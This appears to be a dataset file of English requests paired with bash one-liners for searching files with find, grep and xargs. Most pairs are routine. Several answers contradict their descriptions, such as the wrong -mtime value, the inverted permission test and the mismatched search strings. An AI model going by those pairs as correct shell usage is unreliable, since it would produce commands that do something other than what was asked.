{"input": "Search for \"www.athabasca\" in all files under current directory", "answer": "find . -exec grep \"www.athabasca\" '{}' \\; -print"}
{"input": "Search for $GROUP at the beginning of each line in /etc/group and print the last colon (':') separated entry with comma replaced with newlines", "answer": "grep ^$GROUP /etc/group | grep -o '[^:]*$' | tr ',' '\\n'"}
{"input": "Search for $SEARCH in all regular files under $DIR directory tree and display the number of bytes of the matched output", "answer": "find $DIR -type f -exec grep $SEARCH /dev/null {} \\; | wc --bytes"}
{"input": "Search for '/usr/bin/perl' in all regular files under current dirctory tree and also show a long listing of them", "answer": "find . -type f -exec grep \"/usr/bin/perl\" {} \\; -ls"}
{"input": "Search for 'Attached: Yes' in all regular files under '/proc/scsi' directory tree matching the path '/proc/scsi/usb-storage' and show only the matched filenames", "answer": "find /proc/scsi/ -path '/proc/scsi/usb-storage*' -type f | xargs grep -l 'Attached: Yes'"}
{"input": "Search for 'DOGS' in all files with '.txt' extension under ~/documents and also print the file names", "answer": "find ~/documents -type f -name '*.txt' -exec grep -s DOGS {} \\; -print"}
{"input": "Search for 'It took' in all $srch1* (case insensitive) files under current directory", "answer": "find . -iname \"$srch1*\" -exec grep \"It took\" {} \\; -print"}
{"input": "Search for 'It took' in all $srch1* (case insensitive) files under current directory and run the sed script 'N;s/(.*)\\n(.*)/\\2 \\1/' on the output", "answer": "find . -iname \"$srch1*\" -exec grep \"It took\" {} \\; -print |sed -r 'N;s/(.*)\\n(.*)/\\2 \\1/'"}
{"input": "Search for 'Processed Files' in all $srch* (case insensitive) files under current directory", "answer": "find . -iname \"$srch*\" -exec grep \"Processed Files\" {} \\; -print"}
{"input": "Search for 'Processed Files' in all $srch* (case insensitive) files under current directory run the sed script 'N;s/(.*)\\n(.*)/\\2 \\1/' on the output", "answer": "find . -iname \"$srch*\" -exec grep \"Processed Files\" {} \\; -print| sed -r 'N;s/(.*)\\n(.*)/\\2 \\1/'"}
{"input": "Search for 'Text To Find' in all regular files under current directory tree and show the matched files", "answer": "find ./ -type f -exec grep -l \"Text To Find\" {} \\;"}
{"input": "Search for 'Text To Find' in all regular files under current directory tree and show the matched files and matched lines with line numbers", "answer": "find ./ -type f -exec grep -Hn \"Text To Find\" {} \\;"}
{"input": "Search for 'birthday' (case insensitive) in all regular files under ~/Documents directory tree and show only the filenames", "answer": "find ~/Documents -type f -print0 | xargs -0 grep -il birthday"}
{"input": "Search for 'class Pool' in all *.java (case insensitive) files under current directory", "answer": "find -iname '*.java'|xargs grep 'class Pool'"}
{"input": "Search for 'example' in all regular files from the current directory", "answer": "find -maxdepth 1 -type f | xargs grep -F 'example'"}
{"input": "Search for 'example' in all regular files from the current directory tree", "answer": "find -type f -print0 | xargs -r0 grep -F 'example'"}
{"input": "Search for 'example' in all regular files under current directory tree", "answer": "find . -type f -print | xargs grep \"example\""}
{"input": "Search for 'example' in all regular files under current directory tree and also print the filenames", "answer": "find . -type f -exec grep \"example\" '{}' \\; -print"}
{"input": "Search for 'foo' in all regular files under 'sources' directory tree and show the matched lines with filenames", "answer": "find sources -type f -exec grep -H foo {} +"}
{"input": "Search for 'foo' in all the java files under 'dir1', 'dir2' and 'dir3' directory tree and print only the names of the matched files", "answer": "find dir1 dir2 dir3 -type f -name \"*.java\" -exec grep -il 'foo' {} \\;"}
{"input": "Search for 'foo=' in all *.png files under current directory without descending into *.gif and *.svn directories", "answer": "find . -name \"*.png\" -prune -o -name \"*.gif\" -prune -o -name \"*.svn\" -prune -o -print0 | xargs -0 -I FILES grep -IR \"foo=\" FILES"}
{"input": "Search for 'invalidTemplateName' in all regular files in directories/files taken from the glob pattern './online_admin/*/UTF-8/*' and show the matched lines with the filenames", "answer": "find ./online_admin/*/UTF-8/* -type f -exec grep -H \"invalidTemplateName\" {} \\;"}
{"input": "Search for 'ireg' in all PHP files under 'project' directory tree and show only the files that match", "answer": "find project -name '*.php' -type f -print0 | xargs -0 grep -l ireg"}
{"input": "Search for 'js' in all files under current directory that match 'some string' in their names", "answer": "find . | grep 'some string' | grep js"}
{"input": "Search for 'keyword' in all javascript files under current directory tree excluding all paths that includes the directory 'node_modules'", "answer": "find ./ -not -path \"*/node_modules/*\" -name \"*.js\" | xargs grep keyword"}
{"input": "Search for 'magic' in all regular files under current directory tree", "answer": "find . -type f | xargs grep \"magic\""}
{"input": "Search for 'mystring' in all *.txt (case insensitive) files under current directory", "answer": "find . -iname *.txt -exec egrep mystring \\{\\} \\;"}
{"input": "Search for 'mystring' in all *.txt files under current directory", "answer": "find . -name \"*.txt\" -exec egrep mystring {} \\;"}
{"input": "Search for 'organic' in all files with '.html' extension under ~/html directory", "answer": "find ~/html/ -name '*.html' -exec grep organic '{}' ';'"}
{"input": "Search for 'pattern' in all files with '.cc' extension under current directory tree and show the matched lines with line numbers and filenames", "answer": "find . -name '*.cc' |xargs grep -n 'pattern'"}
{"input": "Search for 'pattern' in file 'file' and print the matched lines by separating them with spaces instead of newlines", "answer": "grep pattern file | tr '\\n' ' '"}
{"input": "Search for 'pattern_to_search' in all regular files with '.txt' extension under '/directory/containing/files' and show the matched lines along with filenames", "answer": "find /directory/containing/files -type f -name \"*.txt\" -exec grep -H 'pattern_to_search' {} +"}
{"input": "Search for 'some string' in all *.axvw files under current directory and show the matched lines with line numbers", "answer": "find . -name '*.axvw' -exec grep -n 'some string' {} +"}
{"input": "Search for 'some string' in all *js files under current directory and show the matched lines with line numbers", "answer": "find . -name '*js' -exec grep -n 'some string' {} \\;"}
{"input": "Search for 'sometext' in all the files with '.txt' extension under current directory tree and also print the filenames", "answer": "find . -name '*.txt' -exec grep 'sometext' '{}' \\; -print"}
{"input": "Search for 'specific string' in all files matching the name pattern ''*.[txt|TXT]'' under current directory tree", "answer": "find . -name '*.[txt|TXT]' -print | xargs grep 'specific string'"}
{"input": "Search for 'string-to-find' in all HTML files under current directory tree and show the matched lines with their filenames", "answer": "find . -name \\*.html -exec grep -H string-to-find {} \\;"}
{"input": "Search for 'string-to-find' in all files under current directory tree and show the matched lines with their filenames", "answer": "find . -exec grep -H string-to-find {} \\;"}
{"input": "Search for 'string-to-find' in all files under current directory tree matching the regex 'filename-regex.\\*\\.html' in their paths and show the matched lines along with the filenames", "answer": "find . -regex filename-regex.\\*\\.html -exec grep -H string-to-find {} \\;"}
{"input": "Search for 'string_to_find' in all files under current directory", "answer": "find -type f | sed 's/./\\\\&/g' | xargs grep string_to_find"}
{"input": "Search for 'stuff' in all *,txt files under current directory", "answer": "find . -name \"*.txt\" -print0 | xargs -0 egrep 'stuff'"}
{"input": "Search for 'text' in all regular files under current directory tree", "answer": "find . -type f -exec grep \"text\" {} /dev/null \\;"}
{"input": "Search for 'whatIWantToFind' in all files under current directory", "answer": "find . -exec grep whatIWantToFind {} \\;"}
{"input": "Search for *pattern* in and below current directory", "answer": "find -name \"*pattern*\""}
{"input": "Search for .pdf files", "answer": "find / -name '*.pdf'"}
{"input": "Search for .zip files that are larger than 100M found anywhere in the file system and delete those files", "answer": "find / -type f -name *.zip -size +100M -exec rm -i {} \\;"}
{"input": "Search for ERROR in all btree*.c files under current directory", "answer": "grep ERROR $(find . -type f -name 'btree*.c')"}
{"input": "Search for Subscription.java under current directory, and go to directory containing it", "answer": "cd \"$(find . -name Subscription.java -printf '%h\\n')\""}
{"input": "Search for a line starting with 'use strict' in all files with '.pl' extension under current directory tree and show the unmatched files only", "answer": "find . -name '*.pl' | xargs grep -L '^use strict'"}
{"input": "Search for a pattern \"can't\" in all the files with the name \"file-containing-can't\" in the current directory tree", "answer": "find . -name \"file-containing-can't\" -exec grep \"can't\" '{}' \\; -print"}
{"input": "Search for aaa in all files under current directory and count the number of matches", "answer": "find . -type f -exec grep -o aaa {} \\; | wc -l"}
{"input": "Search for broken symlinks", "answer": "find -L -type l"}
{"input": "Search for case insensitive pattern 'search for me' in all files that match the name pattern '*.[!r]*' under current directory tree", "answer": "find . -name \"*.[!r]*\" -exec grep -i -l \"search for me\" {} \\;"}
{"input": "Search for case-insensitive \"string\" in \"log.tar.gz\"", "answer": "zcat log.tar.gz | grep -a -i \"string\""}
{"input": "Search for directories that contain the phrase \"foo\" but do not end in \".bar\"", "answer": "find . -name '*foo*' ! -name '*.bar' -type d -print"}
{"input": "Search for empty files", "answer": "find . -size 0k"}
{"input": "Search for environmental variables with \"HIST\" in their name or contents", "answer": "set | grep HIST"}
{"input": "Search for file \"file\" between level 2 and 3 of the directory tree", "answer": "find -mindepth 2 -maxdepth 3 -name file"}
{"input": "Search for file \"file\" with minimum depth set to 4", "answer": "find -mindepth 4 -name file"}
{"input": "Search for file names with \"bad\" characters in the current directory and delete the files", "answer": "find . -name '*[+{;\"\\\\=?~()<>&*|$ ]*' -maxdepth 0 -exec rm -f '{}' \\;"}
{"input": "Search for files \"file1\" or \"file9\"", "answer": "find . -name file1 -or -name file9"}
{"input": "Search for files bigger than 10M", "answer": "find ~ -size +10M"}
{"input": "Search for files containing string \"PENDWIDTH\" and view the result using the more command", "answer": "find . -exec grep PENWIDTH {} \\; | more"}
{"input": "Search for files greater than 20MB in the entire file system and display the path and file size", "answer": "find / -type f -size +20M -exec ls -lh {} \\; | awk '{ print $NF \": \" $5 }'"}
{"input": "Search for files greater than 20MB under your home directory (/home/user)", "answer": "find ~ -size +20M"}
{"input": "Search for files in the current user's home directory and below for files that have not been accessed for more than 100 days and ask the user for permission to delete each file, one by one", "answer": "find ~/ -atime +100 -exec rm -i {} \\;"}
{"input": "Search for files in your home directory which have been modified in the last twenty-four hours", "answer": "find $HOME  -mtime 0"}
{"input": "Search for files in your home directory which have been modified in the last twenty-four hours", "answer": "find $HOME  -mtime 0"}
{"input": "Search for files only that end with .php and look for the string $test inside those files", "answer": "find . -name \\*.php -type f -exec grep -Hn '$test' {} \\+"}
{"input": "Search for files specifying the maximum depth of the search", "answer": "find -maxdepth num -name query"}
{"input": "Search for files specifying the minimum depth of the search", "answer": "find -mindepth num -name query"}
{"input": "Search for files that are at least 1.1GB", "answer": "find / -size +1.1G"}
{"input": "Search for files that are at least 100MB", "answer": "find / -size +100M"}
{"input": "Search for files that were accessed less than 5 days ago", "answer": "find -atime -5"}
{"input": "Search for files which are writable by somebody", "answer": "find . -perm /222"}
{"input": "Search for files which have read and write permission for their owner and group, and which other users can read, without regard to the presence of any extra permission bits", "answer": "find . -perm -664"}
{"input": "Search for files which have read and write permission for their owner, and group, but which other users can read but not write to", "answer": "find . -perm 664"}
{"input": "Search for files whose name is \"filename\" and whose permissions are 777", "answer": "find / -perm 777 -iname \"filename\""}
{"input": "Search for files whose size is between 100 kilobytes and 500 kilobytes", "answer": "find . -size +100k -a -size -500k"}
{"input": "Search for files with \"demo\" in their names and \"sitesearch\" in their path names", "answer": "find . -iname '*demo*' | grep -i sitesearch"}
{"input": "Search for files with \"sitesearch\" in their names and \"demo\" in their path names", "answer": "find . -iname '*sitesearch*' | grep demo"}
{"input": "Search for files/directories named 'fileName.txt' under '/path/to/folder' directory tree without traversing into directories that contain the string 'ignored_directory' in their paths", "answer": "find /path/to/folder -path \"*/ignored_directory\" -prune -o -name fileName.txt -print"}
{"input": "Search for files/directories that are readable for everybody, have at least one write bit set but are not executable for anybody", "answer": "find . -perm -444 -perm /222 ! -perm /111"}
{"input": "Search for files/directories which are writable by both their owner and their group", "answer": "find . -perm -220"}
{"input": "Search for files/directories which are writable by either their owner or their group", "answer": "find . -perm /220"}
{"input": "Search for files/directories which are writable by somebody (their owner, or their group, or anybody else)", "answer": "find . -perm /222"}
{"input": "Search for files/directories with a case insensitive .txt extension in entire file system", "answer": "find / -iname '*.txt'"}
{"input": "Search for files/directories with the case insensitive pattern anaconda* in /var/log", "answer": "find /var/log/ -iname anaconda*"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in /var/log", "answer": "find /var/log/ -iname anaconda.*"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in /var/log directory and create an archive (file.tar) of the last file found", "answer": "find /var/log/ -iname anaconda.* -exec tar -cvf file.tar {} \\;"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in var/log directory", "answer": "find var/log/ -iname anaconda.*"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in var/log directory and create an archive (file.tar) of all the files found", "answer": "find var/log/ -iname \"anaconda.*\" -exec tar -rvf file.tar {} \\;"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in var/log directory and create an archive (file.tar) of the last file found", "answer": "find var/log/ -iname anaconda.* -exec tar -cvf file.tar {} \\;"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in var/log directory and create an archive (file1.tar) of the last block of files sent to xargs", "answer": "find var/log/ -iname anaconda.* | xargs tar -cvf file1.tar"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in var/log directory and create an archive (somefile.tar) of all the files found", "answer": "tar -cvf file.tar `find var/log/ -iname \"anaconda.*\"`"}
{"input": "Search for files/directories with the case insensitive pattern anaconda.* in var/log directory and create an archive (somefile.tar) of all the files found ensuring white space safety", "answer": "find var/log -print0 -iname 'anaconda.*' | tar -cvf somefile.tar -T -"}
{"input": "Search for first match of the case insensitive regex 'oyss' in all *.txt files under current directory and print the file paths along with the matches", "answer": "find . -name '*.txt'|xargs grep -m1 -ri 'oyss'"}
{"input": "Search for first match of the case insensitive regex 're' in all *.coffee files under current directory", "answer": "find . -name \\*.coffee -exec grep -m1 -i 're' {} \\;"}
{"input": "Search for first match of the case insensitive regex 're' in all *.coffee files under current directory and print the file paths along with the matches", "answer": "find . -print0 -name '*.coffee'|xargs -0 grep -m1 -ri 're'"}
{"input": "Search for first match of the regex 're' in all *.coffee files under current directory", "answer": "find . -name '*.coffee' -exec awk '/re/ {print;exit}' {} \\;"}
{"input": "Search for first match of the regex 're' in all *.coffee files under current directory and print the file names", "answer": "find . -name \\*.coffee -exec awk '/re/ {print FILENAME \":\" $0;exit}' {} \\;"}
{"input": "Search for hidden files non-recursively", "answer": "find . -name '.?*' -prune"}
{"input": "Search for line 111 in file \"active_record.rb\" with 2 lines of context", "answer": "nl -ba  -nln  active_record.rb  | grep -C 2 '^111 '"}
{"input": "Search for line number 111 in file \"active_record.rb\"", "answer": "nl -ba  -nln  active_record.rb  | grep '^111 '"}
{"input": "Search for lines that have zero or more whitespace characters before \"http://\" and number the uniquely sorted output", "answer": "grep '^[[:space:]]*http://' | sort -u | nl"}
{"input": "Search for non-empty files", "answer": "find . ! -size 0k"}
{"input": "Search for occurrences of string \"main(\" in the .c files from the current directory tree", "answer": "find . -name \"*.c\" -print | xargs grep \"main(\""}
{"input": "Search for regular expression 'expr' in all .c and .h files from the current directory tree", "answer": "find -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "Search for regular files of the user bluher in the file system", "answer": "find / -type f -user bluher -exec ls -ls {}  \\;"}
{"input": "Search for symlinks pointing to anywhere within /mnt/oldname/", "answer": "find / -type l -lname '/mnt/oldname*'"}
{"input": "Search for the Perl regex \"[\\x80-\\xFF]\" in *.xml files under current directory tree", "answer": "find . -name *.xml | xargs grep -P \"[\\x80-\\xFF]\""}
{"input": "Search for the case insensitive pattern 'search for me' in all files with '.p', '.w' and '.i' extension under current directory tree without descending into '.svn' and 'pdv' directories", "answer": "find . \\( \\( -name .svn -o -name pdv \\) -type d -prune \\) -o \\( -name '*.[pwi]' -type f -exec grep -i -l \"search for me\" {} + \\)"}
{"input": "Search for the case insensitive regex 'STRING_TO_SEARCH_FOR' in all files under current directory", "answer": "find . -type f -exec grep -n -i STRING_TO_SEARCH_FOR /dev/null {} \\;"}
{"input": "Search for the case insensitive regex expanded by $2 in all files named $1 (to be expanded) under current directory", "answer": "find . -name \"$1\" -type f -exec grep -i \"$2\" '{}' \\;"}
{"input": "Search for the extended grep regex 'expr' in all files with '.c' and '.h' extension under current directory tree", "answer": "find . -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "Search for the extended regex expanded by\"$MONTH\\/$YEAR.*GET.*ad=$ADVERTISER HTTP\\/1\" in the decompressed contents of the /var/log/apache2/access*.gz files that are newer than ./tmpoldfile and older than ./tmpnewfile", "answer": "find /var/log/apache2/access*.gz -type f -newer ./tmpoldfile ! -newer ./tmpnewfile \\ | xargs zcat | grep -E \"$MONTH\\/$YEAR.*GET.*ad=$ADVERTISER HTTP\\/1\" -c"}
{"input": "Search for the extened regex 'expr' in all files with '.c' and '.h' extension under current directory tree", "answer": "find . -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "Search for the files that are owned by user rooter or by user www-data", "answer": "find -user root -o -user www-data"}
{"input": "Search for the literal string 'v$process' in all files under current directory", "answer": "find . -print|xargs grep v\\$process"}
{"input": "Search for the pattern '^use strict' in all *.pl files under current directory", "answer": "find . -name '*.pl' | xargs    grep -L '^use strict'"}
{"input": "Search for the pattern 'search string' in all the files in the ''/tmp folder and display the matched lines along with the file names", "answer": "find /tmp -type f -exec grep 'search string' '{}' /dev/null \\+"}
{"input": "Search for the query \"filename\" in the current directory and any subdirectories", "answer": "find -iname \"filename\""}
{"input": "Search for the regex \"+\\S\\+\" in file 'in.txt' and print the matches by replacing newlines with comma (',')", "answer": "grep -o \"+\\S\\+\" in.txt | tr '\\n' ','"}
{"input": "Search for the regex \"\\$wp_version =\" in all the regular files that end with '/wp-includes/version.php' (case insensitive) in their paths in directories/files taken from the glob pattern '/home/*//public_html/' and show the matched lines along with the file names", "answer": "find /home/*/public_html/ -type f -iwholename \"*/wp-includes/version.php\" -exec grep -H \"\\$wp_version =\" {} \\;"}
{"input": "Search for the regex \"\\$wp_version =\" in all the regular files that end with '/wp-includes/version.php' (case insensitive) in their paths in directories/files taken from the glob pattern '/var/www/vhosts/*/httpdocs' and show the matched lines along with the file names", "answer": "find /var/www/vhosts/*/httpdocs -type f -iwholename \"*/wp-includes/version.php\" -exec grep -H \"\\$wp_version =\" {} \\;"}
{"input": "Search for the regex $greppattern in all files with '.c' or '.h' extension under $searchpath with name pattern $filepat and show the matched line numbers, file names and matched lines", "answer": "find \"$searchpath\" -name \"$filepat.[ch]\" -exec grep --color -aHn \"$greppattern\" {} \\;"}
{"input": "Search for the regex '->get(\\|#hyphenate' in all files with '.pl' or '.pm' extension under '/users/tom' directory tree and only show the filenames", "answer": "find /users/tom -name '*.p[lm]' -exec grep -l -- '->get(\\|#hyphenate' {} +"}
{"input": "Search for the regex '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' in all files under /etc", "answer": "find /etc -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \\;"}
{"input": "Search for the regex '^ERROR' in all *.log files under current directory", "answer": "find . -name \"*.log\" -exec egrep -l '^ERROR' {} \\;"}
{"input": "Search for the regex 'pattern_to_search' in all files under '/directory/containing/files' and show the matched lines as well as the file names", "answer": "find /directory/containing/files -type f -exec grep -H 'pattern_to_search' {} +"}
{"input": "Search for the regex ^catalina in the first line of each file under current directory", "answer": "find -type f | xargs head -v -n 1 | grep -B 1 -A 1 -e '^catalina'"}
{"input": "Search for the regex expanded by the variable $SEARCH in all regular files under $DIR directory tree", "answer": "find \"$DIR\" -type f -exec grep -q \"$SEARCH\" {} + ;"}
{"input": "Search for the regex expaned by the variable $SEARCH in all regular files under $DIR directory tree", "answer": "find \"$DIR\" -type f -exec grep \"$SEARCH\" {} \\;"}
{"input": "Search for the string \"ERROR\" in all XML files in the current working directory tree", "answer": "find . -name \"*.xml\" -exec grep \"ERROR\" /dev/null '{}' \\+"}
{"input": "Search for the string 'device' in all regular files in the entire filesystem", "answer": "find / -type f -print | xargs grep \"device\""}
{"input": "Search for the string 'foo' in *.html files under /usr/src/linux directory", "answer": "grep foo `find /usr/src/linux -name \"*.html\"`"}
{"input": "Search for the string 'git' in all the files under current directory tree excluding paths and names that contain the string 'git'", "answer": "find . -not -path \"*git*\" -not -name '*git*' |grep git"}
{"input": "Search for the string 'git' in all the files under current directory tree without traversing into '.git' folder and excluding files that have 'git' in their names", "answer": "find . -path ./.git -prune -o -not -name '*git*' -print |grep git"}
{"input": "Search for the string 'magic' in all regular files under current directory tree and display long listing of them", "answer": "find . -type f -exec grep \"magic\" {} \\; -ls"}
{"input": "Search for the wp-config.php file in /var/www and one level below", "answer": "find /var/www/ -name wp-config.php -maxdepth 2"}
{"input": "Search level 3 of the current directory tree for the directories whose pathnames contain \"New Parts\"", "answer": "find -mindepth 3 -maxdepth 3 -type d | grep \"New Parts\""}
{"input": "Search my_folder recursively for text files containing \"needle text\"", "answer": "find my_folder -type f -exec grep -l \"needle text\" {} \\; -exec file {} \\; | grep text"}
{"input": "Search non-recursively directory tree `MyApp.app' for directories whose name is 'Headers' and delete them in an optimized way", "answer": "find MyApp.app -name Headers -type d -prune -exec rm -rf {} +"}
{"input": "Search recursively through /mydir, outputting only the base (leaf) name of each file, directory, symlink etc. without any containing directories, that is the part following the last slash", "answer": "find /mydir | xargs -I{} basename {}"}
{"input": "Search regular files from the /path/to/dir directory tree for lines that contain \"_START\" and are enclosed in lines \"@GROUP\" and \"@END_GROUP\"", "answer": "find /path/to/dir -type f -exec sed '/@GROUP/,/@END_GROUP/!d' {} + | grep '_START'"}
{"input": "Search regular files under ~/mail for string \"Linux\"", "answer": "find ~/mail -type f | xargs grep \"Linux\""}
{"input": "Search subdirectory `Linux' in the current directory for file `teste.tex'", "answer": "find -path './Linux/*' -name teste.tex"}
{"input": "Search the \"your/dir\" directory for empty subdirectories", "answer": "find your/dir -mindepth 1 -prune -empty"}
{"input": "Search the 'tmp' directory for .mp3 files", "answer": "find tmp -maxdepth 1 -name '*.mp3'"}
{"input": "Search the *.c files residing in the current directory tree for string \"blash\"", "answer": "find . -name *.c -exec grep -n -e blash {} \\;"}
{"input": "Search the *.cc files in the current directory tree for string \"xxx\"", "answer": "find . -name \"*.cc\" -print -exec grep \"xxx\" {} \\;"}
{"input": "Search the *.code files from the current directory tree for string 'pattern'", "answer": "find . -name '*.code' -exec grep -H 'pattern' {} +"}
{"input": "Search the *.txt files from the current directory tree for \"string\"", "answer": "find . -name \"*.txt\" -print0 | xargs -0 egrep 'string'"}
{"input": "Search the .VER files from the current directory tree for Perl regular expression \"Model-Manufacturer:.\\n.\"", "answer": "find . -name \"*.VER\" -exec grep -P 'Model-Manufacturer:.\\n.' '{}' ';' -print"}
{"input": "Search the .VER files from the current directory tree for string \"Test_Version='", "answer": "find . -name \"*.VER\" -exec grep 'Test_Version=' '{}' ';' -print;"}
{"input": "Search the .c files residing in the Lib/ directory tree for lines beginning with \"PyErr\"", "answer": "find Lib/ -name '*.c' -print0 | xargs -0 grep ^PyErr"}
{"input": "Search the .cs files of the current directory tree for string \"content pattern\"", "answer": "find ./ -type f -iname \"*.cs\" -print0 | xargs -0 grep \"content pattern\""}
{"input": "Search the .css files in the /starting/directory tree for \".ExampleClass\"", "answer": "find /starting/directory -type f -name '*.css' | xargs -ti grep '\\.ExampleClass' {}"}
{"input": "Search the .java files from the /Applications/ directory tree for TODO lines", "answer": "find /Applications/ -name \"*.java\" -exec grep -i TODO {} +"}
{"input": "Search the .java files from the current directory tree for TODO lines", "answer": "find . -name \"*.java\" -exec grep -Hin TODO {} \\;"}
{"input": "Search the .log files in the current directory tree for string \"The SAS System\"", "answer": "find `pwd` -name \"*.log\" -exec grep \"The SAS System\" {} \\;"}
{"input": "Search the .py files residing in the current directory tree for \"something\"", "answer": "find . -name \"*.py\" -type f -exec grep \"something\" {} \\;"}
{"input": "Search the .sh files in the current directory tree for string \"ksh\"", "answer": "find . -name \"*.sh\" | xargs grep \"ksh\""}
{"input": "Search the /Path directory tree for files matching pattern \"file_name*\" and containing \"bar\" in their pathnames", "answer": "find /Path -name \"file_name*\" | grep \"bar\""}
{"input": "Search the /dir directory tree for files whose names match regular expression '2015.*(album|picture)'", "answer": "find /dir|egrep '2015.*(album|picture)'"}
{"input": "Search the /etc directory tree for symbolic links", "answer": "find /etc -type l -print"}
{"input": "Search the /home/bozo/projects directory tree for files modified within the last 24 hours", "answer": "find /home/bozo/projects -mtime 1"}
{"input": "Search the /home/pankaj directory for regular files whose status has changed within the last 5 minutes", "answer": "find /home/pankaj -maxdepth 1 -cmin -5 -type f"}
{"input": "Search the /home/weedly directory tree for regular files named myfile", "answer": "find /home/weedly -name myfile -type f -print"}
{"input": "Search the /media/shared directory recursively for MP3 and OGG files", "answer": "find /media/shared \\( -iname \"*.mp3\" -o -iname \"*.ogg\" \\)"}
{"input": "Search the /mnt/raid/upload directory tree for files that have been modified within the last 7 days", "answer": "find /mnt/raid/upload -mtime -7 -print"}
{"input": "Search the /myfiles directory tree for files that are 5 512 byte blocks in size", "answer": "find /myfiles -size 5"}
{"input": "Search the /myfiles directory tree for regular files with read and write permissions set for `others'", "answer": "find /myfiles -type f -perm -o+rw"}
{"input": "Search the /path directory tree for files lacking the group writable bit", "answer": "find /path ! -perm /020"}
{"input": "Search the /path directory tree for files missing g+w and o+w bits", "answer": "find /path ! -perm /022"}
{"input": "Search the /path directory tree for files missing g+w or o+w bits", "answer": "find /path ! -perm -022"}
{"input": "Search the /path directory tree for files that do not have a valid user or group", "answer": "find /path -nouser -or -nogroup"}
{"input": "Search the /path tree for all executables", "answer": "find /path -perm /ugo+x"}
{"input": "Search the /path/to/directory tree for regular files modified 61 days ago and then remove them", "answer": "find /path/to/directory -type f -mtime 61 -exec rm -f {} \\;"}
{"input": "Search the /root directory recursively for the regular file named \"myfile\" ignoring \"work\" directories", "answer": "find /root/ -name 'work' -prune -o -name myfile -type f -print"}
{"input": "Search the /root directory recursively for the regular file named \"myfile\" ignoring /root/work/", "answer": "find /root/ -path '/root/work' -prune -o -name myfile -type f -print"}
{"input": "Search the /storage/sdcard0/tencent/MicroMsg/ directory tree for JPG files", "answer": "find  /storage/sdcard0/tencent/MicroMsg/ -type f  -iname '*.jpg' -print0"}
{"input": "Search the /tmp tree for files between 10kb and 20kb", "answer": "find /tmp -size +10k -size -20k"}
{"input": "Search the /tmp/ directory recursively for files matching regular expression \".*file[0-9]+$\"", "answer": "find /tmp -regex \".*file[0-9]+$\""}
{"input": "Search the /usr/ directory tree for files newer than file /tmp/stamp", "answer": "find /usr -newer /tmp/stamp"}
{"input": "Search the /var/www/ tree for files not owned by user `apache'", "answer": "find /var/www ! -user apache -print0 | xargs -0"}
{"input": "Search the /var/www/ tree for files owned by root or unknown group and change their group to 'apache'", "answer": "find /var/www -group root -o -nogroup -print0 | xargs -0 chown :apache"}
{"input": "Search the CSS files found in the current directory tree for string \"foo\"", "answer": "find . -name \\*.css -print0 | xargs -0 grep -nH foo"}
{"input": "Search the XML files from directories /res/values-en-rUS and /res/xml for string \"hovering_msg\"", "answer": "find /res/values-en-rUS /res/xml -iname '*.xml' -print0 | xargs -0 -d '\\n' -- grep -i \"hovering_msg\" --"}
{"input": "Search the `research' directory and one level below for directories that are not owned by group `ian'", "answer": "find -L research -maxdepth 2 -type d ! -group ian"}
{"input": "Search the current directory and all of its sub-directories for the file 'file1'", "answer": "find . -name file1 -print"}
{"input": "Search the current directory and all of its sub-directory for any PDF files being careful to prevent the shell from expanding \"*\"  before it's passed to find", "answer": "find . -name \\*.pdf -print"}
{"input": "Search the current directory and all of its sub-directory for any PDF files being careful to prevent the shell from expanding anything in '*.pdf'  before it'ss passed to find", "answer": "find . -name '*.pdf' -print"}
{"input": "Search the current directory and all of its sub-directory for any PDF files", "answer": "find . -name \"*.pdf\" -print"}
{"input": "Search the current directory and its sub-directories for any file that has \"bsd\" somewhere in its name", "answer": "find . -name \"*bsd*\" -print"}
{"input": "Search the current directory and two levels below for file `teste.tex'", "answer": "find ~/ -maxdepth 3 -name teste.tex"}
{"input": "Search the current directory for HTML files whose names begin with \"a\"", "answer": "find . -maxdepth 1 -name a\\*.html"}
{"input": "Search the current directory for all files with no 'read' privilege for 'others'", "answer": "find . -maxdepth 1 ! -perm  -o=r"}
{"input": "Search the current directory for all regular files executable by 'user', 'group', and 'others'", "answer": "find . -maxdepth 1 -type f -perm -ugo=x"}
{"input": "Search the current directory for files whose names start with \"messages.\" ignoring SVN and CVS files", "answer": "find \\( -name 'messages.*' ! -path \"*/.svn/*\" ! -path \"*/CVS/*\" \\) -exec grep -Iw uint {} +"}
{"input": "Search the current directory for files whose names start with \"messages.\" ignoring SVN files", "answer": "find \\( -name 'messages.*' ! -path \"*/.svn/*\" \\) -exec grep -Iw uint {} +"}
{"input": "Search the current directory for files whose names start with \"messages.\" ignoring SVN, GIT, and .anythingElseIwannaIgnore files", "answer": "find -name 'messages.*' -exec grep -Iw uint {} + | grep -Ev '.svn|.git|.anythingElseIwannaIgnore'"}
{"input": "Search the current directory for files whose names start with my", "answer": "find . -name 'my*'"}
{"input": "Search the current directory recursively for *.txt files with lines that match regular expression \"^string\"", "answer": "find . -name \"*.txt\" -exec egrep -l '^string' {} \\;"}
{"input": "Search the current directory recursively for .m4a files", "answer": "find . -type f -iname *.m4a -print"}
{"input": "Search the current directory recursively for .sh files whose names begin with \"new\"", "answer": "find . -name \"new*.sh\""}
{"input": "Search the current directory recursively for MOV files", "answer": "find . -iname *.mov"}
{"input": "Search the current directory recursively for MOV files, following symlinks", "answer": "find . -iname \"*.mov\" -follow"}
{"input": "Search the current directory recursively for directories with the execute permission set for everybody", "answer": "find -type d ! -perm -111"}
{"input": "Search the current directory recursively for files containing \"needle text\"", "answer": "find . -type f -exec grep -Iq . {} \\; -and -print0 | xargs -0 grep \"needle text\""}
{"input": "Search the current directory recursively for files last modified within the past 24 hours ignoring .swp files and \"en\" and \"es\" directories", "answer": "find . \\( -name en -o -name es \\) -prune , -mtime 0 ! -name \"*.swp\""}
